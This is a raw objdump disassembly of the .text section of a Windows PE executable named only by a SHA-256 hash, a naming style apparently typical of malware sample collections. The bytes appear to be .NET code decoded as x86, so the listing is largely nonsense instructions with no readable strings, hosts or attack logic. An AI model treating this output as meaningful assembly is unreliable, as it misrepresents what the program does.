
c1536de933e06fd3832c008876559dc99dc38e3f4ec479e9512ceccb39c2f838.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	inc    eax
  402001:	xchg   ecx,eax
  402002:	add    BYTE PTR [eax],al
  402004:	add    BYTE PTR [eax],al
  402006:	add    BYTE PTR [eax],al
  402008:	dec    eax
  402009:	add    BYTE PTR [eax],al
  40200b:	add    BYTE PTR [edx],al
  40200d:	add    BYTE PTR ds:0x35b800,al
  402013:	add    BYTE PTR [eax],ah
  402015:	pop    edx
  402016:	add    BYTE PTR [eax],al
  402018:	or     DWORD PTR [eax],eax
  40201a:	add    BYTE PTR [eax],al
  40201c:	add    al,BYTE PTR [eax]
  40201e:	add    BYTE PTR [esi],al
  402020:	fsubr  DWORD PTR ds:0x7df0000
  402026:	add    BYTE PTR [eax],al
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax],al
  40202d:	add    DWORD PTR [eax],eax
	...
  40204f:	add    BYTE PTR [edx],dl
  402051:	or     ebx,edx
  402053:	sub    edx,esi
  402055:	iret   
  402056:	jge    0x402067
  402058:	xchg   ebp,eax
  402059:	sub    edi,DWORD PTR ds:0x1a3ed7f7
  40205f:	xchg   edi,eax
  402060:	jmp    0x4358:0xad83f1db
  402067:	je     0x4020cf
  402069:	pop    ecx
  40206a:	ins    DWORD PTR es:[edi],dx
  40206b:	cmp    ch,0xd
  40206e:	popf   
  40206f:	or     eax,0xc8c85818
  402074:	dec    edi
  402075:	je     0x40205c
  402077:	fcmovb st,st(2)
  402079:	ss gs mov ecx,0x52fd5274
  402080:	jge    0x40205a
  402082:	sbb    dh,al
  402084:	cmp    al,0x32
  402086:	or     BYTE PTR [edi],0xa3
  402089:	sahf   
  40208a:	rcl    BYTE PTR [ecx-0x42dbe880],cl
  402090:	das    
  402091:	push   0xffffffdb
  402093:	dec    ebx
  402094:	xchg   edx,eax
  402095:	call   0x5dbc:0x9051c2f5
  40209c:	pop    ebp
  40209d:	jnp    0x402047
  40209f:	xor    BYTE PTR [eax+0x67a40da2],bl
  4020a5:	or     eax,DWORD PTR [ebx+0xe04a080]
  4020ab:	sysret 
  4020ad:	inc    eax
  4020ae:	shl    DWORD PTR [edi],0x1f
  4020b1:	(bad)  
  4020b2:	call   0xdb6c514e
  4020b7:	out    0x4f,eax
  4020b9:	mov    ah,0x63
  4020bb:	sbb    ch,cl
  4020bd:	mov    al,0xa0
  4020bf:	je     0x40207d
  4020c1:	jno    0x402048
  4020c3:	cmp    BYTE PTR [ebp-0x78],cl
  4020c6:	inc    esp
  4020c7:	and    eax,0xabd17e8b
  4020cc:	sbb    eax,0xb7ba3985
  4020d1:	mov    ah,0x18
  4020d3:	stc    
  4020d4:	mov    ch,0x9
  4020d6:	nop
  4020d7:	add    eax,0x7234d034
  4020dc:	mov    cl,0x75
  4020de:	push   ds
  4020df:	int    0x15
  4020e1:	sbb    DWORD PTR [edi+0x72f325da],ebp
  4020e7:	sub    ch,dh
  4020e9:	mov    DWORD PTR [edi+0x6e],esi
  4020ec:	jno    0x402101
  4020ee:	fsubp  st(7),st
  4020f0:	lock push ecx
  4020f2:	(bad)  
  4020f3:	fist   WORD PTR [edx]
  4020f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020f6:	fsubr  QWORD PTR [ecx]
  4020f8:	popa   
  4020f9:	sub    dl,bl
  4020fb:	stos   BYTE PTR es:[edi],al
  4020fc:	popf   
  4020fd:	call   0xec1c3230
  402102:	mov    ch,0x79
  402104:	pop    edi
  402105:	pusha  
  402106:	in     eax,0x3e
  402108:	cs cwde 
  40210a:	ret    0x4e1f
  40210d:	pop    es
  40210e:	imul   edi,DWORD PTR [edx+0x77],0x26cfdcec
  402115:	pop    es
  402116:	scas   al,BYTE PTR es:[edi]
  402117:	(bad)  
  402118:	out    0x92,al
  40211a:	cdq    
  40211b:	push   esi
  40211c:	mov    dh,0xdc
  40211e:	ja     0x40216f
  402120:	shr    DWORD PTR [ecx+0x74],cl
  402123:	xor    eax,0x3dc940f2
  402128:	dec    esi
  402129:	cmp    DWORD PTR [ebx],esp
  40212b:	push   eax
  40212c:	outs   dx,DWORD PTR ds:[esi]
  40212d:	fisubr DWORD PTR [eax-0x46]
  402130:	pop    esp
  402131:	stc    
  402132:	jp     0x40211b
  402134:	dec    eax
  402135:	aaa    
  402136:	pop    edx
  402137:	pop    esi
  402138:	sub    eax,0x36a2c62e
  40213d:	int    0xf0
  40213f:	mov    ebp,DWORD PTR [ebx+0x3c]
  402142:	xor    dh,BYTE PTR ds:0x92890dd8
  402148:	or     BYTE PTR [ebx+0x6a],al
  40214b:	push   cs
  40214c:	sbb    DWORD PTR [eax+ebp*4+0x3],ecx
  402150:	push   ds
  402151:	add    ch,BYTE PTR [eax]
  402153:	pop    ss
  402154:	add    BYTE PTR [eax],al
  402156:	or     ch,BYTE PTR [edx]
  402158:	sbb    esi,DWORD PTR [eax]
  40215a:	add    al,0x0
  40215c:	mov    al,0x4
  40215e:	add    BYTE PTR [eax],al
  402160:	add    DWORD PTR [eax],eax
  402162:	add    BYTE PTR [ecx],dl
  402164:	sub    BYTE PTR [eax],bl
  402166:	add    BYTE PTR [eax],al
  402168:	or     ch,BYTE PTR [edi+0x19]
  40216b:	add    BYTE PTR [eax],al
  40216d:	or     ch,BYTE PTR [edi+0x1a]
  402170:	add    BYTE PTR [eax],al
  402172:	or     ch,BYTE PTR [eax]
  402174:	sbb    BYTE PTR [eax],al
  402176:	add    BYTE PTR [edx],cl
  402178:	adc    al,0x73
  40217a:	sbb    eax,DWORD PTR [eax]
  40217c:	add    BYTE PTR [edx],cl
  40217e:	add    BYTE PTR [edi],0x0
  402181:	add    BYTE PTR [eax+ebp*1],al
  402184:	sbb    BYTE PTR [eax],al
  402186:	add    BYTE PTR [edx],cl
  402188:	outs   dx,DWORD PTR ds:[esi]
  402189:	sbb    al,0x0
  40218b:	add    BYTE PTR [edx],cl
  40218d:	sub    BYTE PTR ds:0xa0a0000,bl
  402193:	jb     0x402196
  402195:	add    BYTE PTR [eax],al
  402197:	jo     0x40219f
  402199:	outs   dx,DWORD PTR ds:[esi]
  40219a:	push   ds
  40219b:	add    BYTE PTR [eax],al
  40219d:	or     dh,BYTE PTR [edx+0x1f]
  4021a0:	add    BYTE PTR [eax],al
  4021a2:	jo     0x4021aa
  4021a4:	outs   dx,DWORD PTR ds:[esi]
  4021a5:	pop    ds
  4021a6:	add    BYTE PTR [eax],al
  4021a8:	or     ch,BYTE PTR [eax]
  4021aa:	and    BYTE PTR [eax],al
  4021ac:	add    BYTE PTR [edx],cl
  4021ae:	sub    BYTE PTR [ecx],ah
  4021b0:	add    BYTE PTR [eax],al
  4021b2:	or     al,BYTE PTR [esi]
  4021b4:	outs   dx,DWORD PTR ds:[esi]
  4021b5:	and    al,BYTE PTR [eax]
  4021b7:	add    BYTE PTR [edx],cl
  4021b9:	sub    BYTE PTR [ecx],ah
  4021bb:	add    BYTE PTR [eax],al
  4021bd:	or     ch,BYTE PTR [eax]
  4021bf:	and    eax,DWORD PTR [eax]
  4021c1:	add    BYTE PTR [edx],cl
  4021c3:	outs   dx,DWORD PTR ds:[esi]
  4021c4:	and    al,0x0
  4021c6:	add    BYTE PTR [edx],cl
  4021c8:	or     BYTE PTR [eax],0x0
  4021cb:	add    BYTE PTR [edx+eax*1],al
  4021ce:	mov    gs,WORD PTR [ecx+0x2c]
  4021d1:	and    al,0x2
  4021d3:	mov    gs,WORD PTR [ecx+0x16]
  4021d6:	xor    DWORD PTR [esi],esp
  4021d8:	add    dl,BYTE PTR [esi]
  4021da:	call   0x2870:0x3372
  4021e1:	and    eax,0x2d0a0000
  4021e6:	lar    edx,WORD PTR [esi]
  4021e9:	call   0x2870:0x3972
  4021f0:	and    eax,0x2c0a0000
  4021f5:	or     BYTE PTR [eax],ch
  4021f7:	add    eax,DWORD PTR [eax]
  4021f9:	add    BYTE PTR [esi],al
  4021fb:	es push ss
  4021fd:	sub    al,BYTE PTR [edx]
  4021ff:	mov    gs,WORD PTR [ecx+0x17]
  402202:	das    
  402203:	pop    ds
  402204:	jle    0x40220d
  402206:	add    BYTE PTR [eax],al
  402208:	add    al,0x72
  40220a:	aas    
  40220b:	add    BYTE PTR [eax],al
  40220d:	jo     0x40228d
  40220f:	or     BYTE PTR [eax],al
  402211:	add    BYTE PTR [edi+ebp*2],al
  402214:	add    BYTE PTR es:[eax],al
  402217:	or     ch,BYTE PTR [eax]
  402219:	and    DWORD PTR [eax],eax
  40221b:	add    BYTE PTR [edx],cl
  40221d:	sub    BYTE PTR [ebx],al
  40221f:	add    BYTE PTR [eax],al
  402221:	push   es
  402222:	sub    dh,BYTE PTR [edx+0x5b]
  402225:	add    BYTE PTR [eax],al
  402227:	jo     0x402234
  402229:	jle    0x402252
  40222b:	add    BYTE PTR [eax],al
  40222d:	or     cl,BYTE PTR [esi+edi*2]
  402230:	daa    
  402231:	add    BYTE PTR [eax],al
  402233:	or     cl,BYTE PTR ds:0x16061316
  402239:	adc    eax,DWORD PTR [edi]
  40223b:	cmp    BYTE PTR [edx+0x2],bh
  40223e:	add    BYTE PTR [eax],al
  402240:	add    dl,BYTE PTR [ecx]
  402242:	pop    es
  402243:	call   0x6f0a:0x2828
  40224a:	sub    DWORD PTR [eax],eax
  40224c:	add    BYTE PTR [edx],cl
  40224e:	jb     0x4022b1
  402250:	add    BYTE PTR [eax],al
  402252:	jo     0x40227c
  402254:	and    eax,0x2d0a0000
  402259:	sbb    al,BYTE PTR [edx]
  40225b:	adc    DWORD PTR [edi],eax
  40225d:	call   0x6f0a:0x2828
  402264:	sub    DWORD PTR [eax],eax
  402266:	add    BYTE PTR [edx],cl
  402268:	jb     0x4022d1
  40226a:	add    BYTE PTR [eax],al
  40226c:	jo     0x402296
  40226e:	and    eax,0x2c0a0000
  402273:	sbb    BYTE PTR [ecx],dl
  402275:	pop    es
  402276:	pop    ss
  402277:	pop    eax
  402278:	add    cl,BYTE PTR [esi+0x20f2f69]
  40227e:	adc    DWORD PTR [edi],eax
  402280:	pop    ss
  402281:	pop    eax
  402282:	and    eax,0xb9a0713
  402287:	cmp    BYTE PTR [eax],ch
  402289:	add    al,BYTE PTR [eax]
  40228b:	add    BYTE PTR [edx],al
  40228d:	adc    DWORD PTR [edi],eax
  40228f:	call   0x6f0a:0x2828
  402296:	sub    DWORD PTR [eax],eax
  402298:	add    BYTE PTR [edx],cl
  40229a:	jb     0x402309
  40229c:	add    BYTE PTR [eax],al
  40229e:	jo     0x4022c8
  4022a0:	and    eax,0x2d0a0000
  4022a5:	sbb    al,BYTE PTR [edx]
  4022a7:	adc    DWORD PTR [edi],eax
  4022a9:	call   0x6f0a:0x2828
  4022b0:	sub    DWORD PTR [eax],eax
  4022b2:	add    BYTE PTR [edx],cl
  4022b4:	jb     0x402329
  4022b6:	add    BYTE PTR [eax],al
  4022b8:	jo     0x4022e2
  4022ba:	and    eax,0x2c0a0000
  4022bf:	sbb    al,0x11
  4022c1:	pop    es
  4022c2:	pop    ss
  4022c3:	pop    eax
  4022c4:	add    cl,BYTE PTR [esi+0x2132f69]
  4022ca:	adc    DWORD PTR [edi],eax
  4022cc:	pop    ss
  4022cd:	pop    eax
  4022ce:	and    eax,0x809a0713
  4022d3:	add    al,BYTE PTR [eax]
  4022d5:	add    BYTE PTR [eax+edi*1],al
  4022d8:	fadd   DWORD PTR [ecx]
  4022da:	add    BYTE PTR [eax],al
  4022dc:	add    dl,BYTE PTR [ecx]
  4022de:	pop    es
  4022df:	call   0x6f0a:0x2828
  4022e6:	sub    DWORD PTR [eax],eax
  4022e8:	add    BYTE PTR [edx],cl
  4022ea:	jb     0x402365
  4022ec:	add    BYTE PTR [eax],al
  4022ee:	jo     0x402318
  4022f0:	and    eax,0x2d0a0000
  4022f5:	sbb    al,BYTE PTR [edx]
  4022f7:	adc    DWORD PTR [edi],eax
  4022f9:	call   0x6f0a:0x2828
  402300:	sub    DWORD PTR [eax],eax
  402302:	add    BYTE PTR [edx],cl
  402304:	jb     0x402385
  402306:	add    BYTE PTR [eax],al
  402308:	jo     0x402332
  40230a:	and    eax,0x2c0a0000
  40230f:	sbb    al,0x11
  402311:	pop    es
  402312:	pop    ss
  402313:	pop    eax
  402314:	add    cl,BYTE PTR [esi+0x2132f69]
  40231a:	adc    DWORD PTR [edi],eax
  40231c:	pop    ss
  40231d:	pop    eax
  40231e:	and    eax,0x809a0713
  402323:	add    DWORD PTR [eax],eax
  402325:	add    BYTE PTR [eax+edi*1],al
  402328:	mov    BYTE PTR [ecx],al
  40232a:	add    BYTE PTR [eax],al
  40232c:	add    dl,BYTE PTR [ecx]
  40232e:	pop    es
  40232f:	call   0x6f0a:0x2828
  402336:	sub    DWORD PTR [eax],eax
  402338:	add    BYTE PTR [edx],cl
  40233a:	jb     0x4022c1
  40233c:	add    BYTE PTR [eax],al
  40233e:	jo     0x402368
  402340:	and    eax,0x2d0a0000
  402345:	sbb    al,BYTE PTR [edx]
  402347:	adc    DWORD PTR [edi],eax
  402349:	call   0x6f0a:0x2828
  402350:	sub    DWORD PTR [eax],eax
  402352:	add    BYTE PTR [edx],cl
  402354:	jb     0x4022e1
  402356:	add    BYTE PTR [eax],al
  402358:	jo     0x402382
  40235a:	and    eax,0x2c0a0000
  40235f:	sbb    BYTE PTR [ecx],dl
  402361:	pop    es
  402362:	pop    ss
  402363:	pop    eax
  402364:	add    cl,BYTE PTR [esi+0x20f2f69]
  40236a:	adc    DWORD PTR [edi],eax
  40236c:	pop    ss
  40236d:	pop    eax
  40236e:	and    eax,0xc9a0713
  402373:	cmp    BYTE PTR [ecx+eax*1],bh
  402376:	add    BYTE PTR [eax],al
  402378:	add    dl,BYTE PTR [ecx]
  40237a:	pop    es
  40237b:	call   0x6f0a:0x2828
  402382:	sub    DWORD PTR [eax],eax
  402384:	add    BYTE PTR [edx],cl
  402386:	jb     0x402319
  402388:	add    BYTE PTR [eax],al
  40238a:	jo     0x4023b4
  40238c:	and    eax,0x2d0a0000
  402391:	sbb    al,BYTE PTR [edx]
  402393:	adc    DWORD PTR [edi],eax
  402395:	call   0x6f0a:0x2828
  40239c:	sub    DWORD PTR [eax],eax
  40239e:	add    BYTE PTR [edx],cl
  4023a0:	jb     0x402339
  4023a2:	add    BYTE PTR [eax],al
  4023a4:	jo     0x4023ce
  4023a6:	and    eax,0x2c0a0000
  4023ab:	sbb    al,0x11
  4023ad:	pop    es
  4023ae:	pop    ss
  4023af:	pop    eax
  4023b0:	add    cl,BYTE PTR [esi+0x2132f69]
  4023b6:	adc    DWORD PTR [edi],eax
  4023b8:	pop    ss
  4023b9:	pop    eax
  4023ba:	and    eax,0x809a0713
  4023bf:	add    al,0x0
  4023c1:	add    BYTE PTR [eax+edi*1],al
  4023c4:	in     al,dx
  4023c5:	add    BYTE PTR [eax],al
  4023c7:	add    BYTE PTR [edx],al
  4023c9:	adc    DWORD PTR [edi],eax
  4023cb:	call   0x6f0a:0x2828
  4023d2:	sub    DWORD PTR [eax],eax
  4023d4:	add    BYTE PTR [edx],cl
  4023d6:	jb     0x402375
  4023d8:	add    BYTE PTR [eax],al
  4023da:	jo     0x402404
  4023dc:	and    eax,0x2d0a0000
  4023e1:	sbb    al,BYTE PTR [edx]
  4023e3:	adc    DWORD PTR [edi],eax
  4023e5:	call   0x6f0a:0x2828
  4023ec:	sub    DWORD PTR [eax],eax
  4023ee:	add    BYTE PTR [edx],cl
  4023f0:	jb     0x402397
  4023f2:	add    BYTE PTR [eax],al
  4023f4:	jo     0x40241e
  4023f6:	and    eax,0x2c0a0000
  4023fb:	and    DWORD PTR [ecx],edx
  4023fd:	pop    es
  4023fe:	pop    ss
  4023ff:	pop    eax
  402400:	add    cl,BYTE PTR [esi+0x2182f69]
  402406:	adc    DWORD PTR [edi],eax
  402408:	pop    ss
  402409:	pop    eax
  40240a:	and    eax,0x739a0713
  40240f:	or     BYTE PTR [eax],al
  402411:	add    BYTE PTR [esi],al
  402413:	add    BYTE PTR ds:0x38040000,0x97
  40241a:	add    BYTE PTR [eax],al
  40241c:	add    BYTE PTR [edx],al
  40241e:	adc    DWORD PTR [edi],eax
  402420:	call   0x6f0a:0x2828
  402427:	sub    DWORD PTR [eax],eax
  402429:	add    BYTE PTR [edx],cl
  40242b:	jb     0x4023da
  40242d:	add    BYTE PTR [eax],al
  40242f:	jo     0x402459
  402431:	and    eax,0x2d0a0000
  402436:	sbb    al,BYTE PTR [edx]
  402438:	adc    DWORD PTR [edi],eax
  40243a:	call   0x6f0a:0x2828
  402441:	sub    DWORD PTR [eax],eax
  402443:	add    BYTE PTR [edx],cl
  402445:	jb     0x4023fa
  402447:	add    BYTE PTR [eax],al
  402449:	jo     0x402473
  40244b:	and    eax,0x2c0a0000
  402450:	adc    eax,0x58170711
  402455:	add    cl,BYTE PTR [esi+0x20c2f69]
  40245b:	adc    DWORD PTR [edi],eax
  40245d:	pop    ss
  40245e:	pop    eax
  40245f:	and    eax,0xd9a0713
  402464:	sub    ecx,DWORD PTR [esi+0x11]
  402467:	pop    es
  402468:	add    cl,BYTE PTR [esi+0x33591769]
  40246e:	sub    BYTE PTR [edx],al
  402470:	adc    DWORD PTR [edi],eax
  402472:	call   0x2870:0xb972
  402479:	and    eax,0x2c0a0000
  40247e:	sbb    BYTE PTR [esi+0x4],bh
  402481:	add    BYTE PTR [eax],al
  402483:	add    al,0x6f
  402485:	sub    al,BYTE PTR [eax]
  402487:	add    BYTE PTR [edx],cl
  402489:	sub    al,0xc
  40248b:	jle    0x402492
  40248d:	add    BYTE PTR [eax],al
  40248f:	add    al,0x2d
  402491:	add    eax,0x2b061317
  402496:	sbb    eax,0x37e
  40249b:	add    al,0x6f
  40249d:	sub    al,BYTE PTR [eax]
  40249f:	add    BYTE PTR [edx],cl
  4024a1:	sub    eax,0x711020b
  4024a6:	call   0x2b04:0x380
  4024ad:	push   es
  4024ae:	sub    BYTE PTR [ebx],al
  4024b0:	add    BYTE PTR [eax],al
  4024b2:	push   es
  4024b3:	sub    dl,BYTE PTR [ecx]
  4024b5:	pop    es
  4024b6:	pop    ss
  4024b7:	pop    eax
  4024b8:	adc    eax,DWORD PTR [edi]
  4024ba:	adc    DWORD PTR [edi],eax
  4024bc:	add    cl,BYTE PTR [esi-0x283c097]
  4024c2:	(bad)  
  4024c3:	(bad)  
  4024c4:	jle    0x4024c9
  4024c6:	add    BYTE PTR [eax],al
  4024c8:	add    al,0x6f
  4024ca:	sub    al,BYTE PTR [eax]
  4024cc:	add    BYTE PTR [edx],cl
  4024ce:	sub    eax,0x77e1f
  4024d3:	add    BYTE PTR [edx+esi*2],al
  4024d6:	mov    ebp,0x7e700000
  4024db:	or     BYTE PTR [eax],al
  4024dd:	add    BYTE PTR [edi+ebp*2],al
  4024e0:	add    BYTE PTR es:[eax],al
  4024e3:	or     ch,BYTE PTR [eax]
  4024e5:	and    DWORD PTR [eax],eax
  4024e7:	add    BYTE PTR [edx],cl
  4024e9:	sub    BYTE PTR [ebx],al
  4024eb:	add    BYTE PTR [eax],al
  4024ed:	push   es
  4024ee:	sub    bh,BYTE PTR [esi+0x5]
  4024f1:	add    BYTE PTR [eax],al
  4024f3:	add    al,0x2d
  4024f5:	movd   DWORD PTR [eax+eax*1],mm0
  4024f9:	add    BYTE PTR [edi+ebp*2],al
  4024fc:	sub    al,BYTE PTR [eax]
  4024fe:	add    BYTE PTR [edx],cl
  402500:	sub    al,0x3
  402502:	pop    ss
  402503:	adc    eax,DWORD PTR [esi]
  402505:	adc    DWORD PTR [esi],eax
  402507:	sub    al,0x37
  402509:	jb     0x4024e6
  40250b:	add    BYTE PTR [eax],al
  40250d:	jo     0x402537
  40250f:	and    DWORD PTR [eax],eax
  402511:	add    BYTE PTR [edx],cl
  402513:	jle    0x40251c
  402515:	add    BYTE PTR [eax],al
  402517:	add    al,0x72
  402519:	fld    QWORD PTR [eax]
  40251b:	add    BYTE PTR [eax+0x7e],dh
  40251e:	or     BYTE PTR [eax],al
  402520:	add    BYTE PTR [edi+ebp*2],al
  402523:	add    BYTE PTR es:[eax],al
  402526:	or     bh,BYTE PTR [esi+0x4]
  402529:	add    BYTE PTR [eax],al
  40252b:	add    al,0x28
  40252d:	sub    eax,DWORD PTR [eax]
  40252f:	add    BYTE PTR [edx],cl
  402531:	sub    BYTE PTR [esi],al
  402533:	add    BYTE PTR [eax],al
  402535:	push   es
  402536:	jb     0x402513
  402538:	add    BYTE PTR [eax],al
  40253a:	jo     0x402564
  40253c:	and    DWORD PTR [eax],eax
  40253e:	add    BYTE PTR [edx],cl
  402540:	adc    al,BYTE PTR ds:0x528
  402546:	push   es
  402547:	sub    eax,0x9131508
  40254c:	ffree  st(0)
  40254e:	add    BYTE PTR [eax],al
  402550:	add    BYTE PTR [edi],al
  402552:	adc    al,BYTE PTR [edx]
  402554:	jle    0x402559
  402556:	add    BYTE PTR [eax],al
  402558:	add    al,0x12
  40255a:	add    al,0x28
  40255c:	add    al,0x0
  40255e:	add    BYTE PTR [esi],al
  402560:	sub    eax,0x3280c
  402565:	add    BYTE PTR [esi],al
  402567:	adc    ecx,DWORD PTR [ecx]
  402569:	frstor [ebx+0x7e000000]
  40256f:	pop    es
  402570:	add    BYTE PTR [eax],al
  402572:	add    al,0x72
  402574:	test   DWORD PTR [eax],0x87e7000
  40257a:	add    BYTE PTR [eax],al
  40257c:	add    al,0x6f
  40257e:	add    BYTE PTR es:[eax],al
  402581:	or     dh,BYTE PTR [edx+0x1f]
  402584:	add    DWORD PTR [eax],eax
  402586:	jo     0x402606
  402588:	add    eax,DWORD PTR [eax]
  40258a:	add    BYTE PTR [edx+esi*2],al
  40258d:	and    eax,DWORD PTR [ecx]
  40258f:	add    BYTE PTR [eax+0x28],dh
  402592:	and    BYTE PTR [eax],al
  402594:	add    BYTE PTR [edx],cl
  402596:	sub    BYTE PTR [ecx],ah
  402598:	add    BYTE PTR [eax],al
  40259a:	or     dl,BYTE PTR [ecx]
  40259c:	add    eax,0x9080411
  4025a1:	outs   dx,DWORD PTR ds:[esi]
  4025a2:	sub    al,0x0
  4025a4:	add    BYTE PTR [edx],cl
  4025a6:	sub    al,0x1b
  4025a8:	jle    0x4025b1
  4025aa:	add    BYTE PTR [eax],al
  4025ac:	add    al,0x72
  4025ae:	sub    eax,0x7e700001
  4025b3:	or     BYTE PTR [eax],al
  4025b5:	add    BYTE PTR [edi+ebp*2],al
  4025b8:	add    BYTE PTR es:[eax],al
  4025bb:	or     ch,BYTE PTR [eax]
  4025bd:	and    DWORD PTR [eax],eax
  4025bf:	add    BYTE PTR [edx],cl
  4025c1:	sub    ebx,DWORD PTR [ecx]
  4025c3:	jle    0x4025cc
  4025c5:	add    BYTE PTR [eax],al
  4025c7:	add    al,0x72
  4025c9:	dec    ebx
  4025ca:	add    DWORD PTR [eax],eax
  4025cc:	jo     0x40264c
  4025ce:	or     BYTE PTR [eax],al
  4025d0:	add    BYTE PTR [edi+ebp*2],al
  4025d3:	add    BYTE PTR es:[eax],al
  4025d6:	or     ch,BYTE PTR [eax]
  4025d8:	and    DWORD PTR [eax],eax
  4025da:	add    BYTE PTR [edx],cl
  4025dc:	fidiv  WORD PTR [ecx]
  4025de:	adc    ecx,DWORD PTR [eax]
  4025e0:	jle    0x4025e9
  4025e2:	add    BYTE PTR [eax],al
  4025e4:	add    al,0x72
  4025e6:	popa   
  4025e7:	add    DWORD PTR [eax],eax
  4025e9:	jo     0x402669
  4025eb:	or     BYTE PTR [eax],al
  4025ed:	add    BYTE PTR [edi+ebp*2],al
  4025f0:	add    BYTE PTR es:[eax],al
  4025f3:	or     dh,BYTE PTR [edx+0x1f]
  4025f6:	add    DWORD PTR [eax],eax
  4025f8:	jo     0x40260b
  4025fa:	or     BYTE PTR [edi+0x2d],ch
  4025fd:	add    BYTE PTR [eax],al
  4025ff:	or     ch,BYTE PTR [eax]
  402601:	add    BYTE PTR cs:[eax],al
  402604:	or     ch,BYTE PTR [eax]
  402606:	and    DWORD PTR [eax],eax
  402608:	add    BYTE PTR [edx],cl
  40260a:	adc    eax,0x2de0913
  40260f:	push   ss
  402610:	sub    dl,BYTE PTR [ecx]
  402612:	or     DWORD PTR [edx],ebp
  402614:	add    DWORD PTR [eax],edx
  402616:	add    BYTE PTR [eax],al
  402618:	add    BYTE PTR [eax],al
  40261a:	fadd   QWORD PTR [ebx]
  40261c:	sahf   
  40261d:	jp     0x402623
  40261f:	xor    DWORD PTR [eax],ebp
  402621:	add    BYTE PTR [eax],al
  402623:	add    DWORD PTR [ebx],eax
  402625:	xor    BYTE PTR [eax+eax*1],al
  402628:	xchg   edx,eax
  402629:	add    DWORD PTR [eax],eax
  40262b:	add    BYTE PTR [eax],al
  40262d:	add    BYTE PTR [eax],al
  40262f:	add    BYTE PTR [edx+0x77],dh
  402632:	add    DWORD PTR [eax],eax
  402634:	jo     0x4026b4
  402636:	pop    es
  402637:	add    BYTE PTR [eax],al
  402639:	add    al,0x72
  40263b:	stos   DWORD PTR es:[edi],eax
  40263c:	add    DWORD PTR [eax],eax
  40263e:	jo     0x4026be
  402640:	or     BYTE PTR [eax],al
  402642:	add    BYTE PTR [edi+ebp*2],al
  402645:	add    BYTE PTR es:[eax],al
  402648:	or     dh,BYTE PTR [edx-0x45]
  40264b:	add    DWORD PTR [eax],eax
  40264d:	jo     0x402677
  40264f:	add    BYTE PTR cs:[eax],al
  402652:	or     ch,BYTE PTR [eax]
  402654:	and    DWORD PTR [eax],eax
  402656:	add    BYTE PTR [edx],cl
  402658:	jle    0x402661
  40265a:	add    BYTE PTR [eax],al
  40265c:	add    al,0x72
  40265e:	rol    DWORD PTR [ecx],0x0
  402661:	jo     0x4026e1
  402663:	or     BYTE PTR [eax],al
  402665:	add    BYTE PTR [edi+ebp*2],al
  402668:	add    BYTE PTR es:[eax],al
  40266b:	or     ch,BYTE PTR [eax]
  40266d:	and    DWORD PTR [eax],eax
  40266f:	add    BYTE PTR [edx],cl
  402671:	jle    0x40267a
  402673:	add    BYTE PTR [eax],al
  402675:	add    al,0x72
  402677:	fild   DWORD PTR [ecx]
  402679:	add    BYTE PTR [eax+0x7e],dh
  40267c:	or     BYTE PTR [eax],al
  40267e:	add    BYTE PTR [edi+ebp*2],al
  402681:	add    BYTE PTR es:[eax],al
  402684:	or     ch,BYTE PTR [eax]
  402686:	and    DWORD PTR [eax],eax
  402688:	add    BYTE PTR [edx],cl
  40268a:	jle    0x402693
  40268c:	add    BYTE PTR [eax],al
  40268e:	add    al,0x72
  402690:	stc    
  402691:	add    DWORD PTR [eax],eax
  402693:	jo     0x402713
  402695:	or     BYTE PTR [eax],al
  402697:	add    BYTE PTR [edi+ebp*2],al
  40269a:	add    BYTE PTR es:[eax],al
  40269d:	or     ch,BYTE PTR [eax]
  40269f:	and    DWORD PTR [eax],eax
  4026a1:	add    BYTE PTR [edx],cl
  4026a3:	jle    0x4026ac
  4026a5:	add    BYTE PTR [eax],al
  4026a7:	add    al,0x72
  4026a9:	adc    DWORD PTR [edx],eax
  4026ab:	add    BYTE PTR [eax+0x7e],dh
  4026ae:	or     BYTE PTR [eax],al
  4026b0:	add    BYTE PTR [edi+ebp*2],al
  4026b3:	add    BYTE PTR es:[eax],al
  4026b6:	or     ch,BYTE PTR [eax]
  4026b8:	and    DWORD PTR [eax],eax
  4026ba:	add    BYTE PTR [edx],cl
  4026bc:	jle    0x4026c5
  4026be:	add    BYTE PTR [eax],al
  4026c0:	add    al,0x72
  4026c2:	pop    ds
  4026c3:	add    al,BYTE PTR [eax]
  4026c5:	jo     0x402745
  4026c7:	or     BYTE PTR [eax],al
  4026c9:	add    BYTE PTR [edi+ebp*2],al
  4026cc:	add    BYTE PTR es:[eax],al
  4026cf:	or     ch,BYTE PTR [eax]
  4026d1:	and    DWORD PTR [eax],eax
  4026d3:	add    BYTE PTR [edx],cl
  4026d5:	jle    0x4026de
  4026d7:	add    BYTE PTR [eax],al
  4026d9:	add    al,0x72
  4026db:	sub    eax,0x7e700002
  4026e0:	or     BYTE PTR [eax],al
  4026e2:	add    BYTE PTR [edi+ebp*2],al
  4026e5:	add    BYTE PTR es:[eax],al
  4026e8:	or     ch,BYTE PTR [eax]
  4026ea:	and    DWORD PTR [eax],eax
  4026ec:	add    BYTE PTR [edx],cl
  4026ee:	jle    0x4026f7
  4026f0:	add    BYTE PTR [eax],al
  4026f2:	add    al,0x72
  4026f4:	cmp    eax,DWORD PTR [edx]
  4026f6:	add    BYTE PTR [eax+0x7e],dh
  4026f9:	or     BYTE PTR [eax],al
  4026fb:	add    BYTE PTR [edi+ebp*2],al
  4026fe:	add    BYTE PTR es:[eax],al
  402701:	or     ch,BYTE PTR [eax]
  402703:	and    DWORD PTR [eax],eax
  402705:	add    BYTE PTR [edx],cl
  402707:	jle    0x402710
  402709:	add    BYTE PTR [eax],al
  40270b:	add    al,0x72
  40270d:	dec    ecx
  40270e:	add    al,BYTE PTR [eax]
  402710:	jo     0x402790
  402712:	or     BYTE PTR [eax],al
  402714:	add    BYTE PTR [edi+ebp*2],al
  402717:	add    BYTE PTR es:[eax],al
  40271a:	or     ch,BYTE PTR [eax]
  40271c:	and    DWORD PTR [eax],eax
  40271e:	add    BYTE PTR [edx],cl
  402720:	jle    0x402729
  402722:	add    BYTE PTR [eax],al
  402724:	add    al,0x72
  402726:	push   edi
  402727:	add    al,BYTE PTR [eax]
  402729:	jo     0x4027a9
  40272b:	or     BYTE PTR [eax],al
  40272d:	add    BYTE PTR [edi+ebp*2],al
  402730:	add    BYTE PTR es:[eax],al
  402733:	or     ch,BYTE PTR [eax]
  402735:	and    DWORD PTR [eax],eax
  402737:	add    BYTE PTR [edx],cl
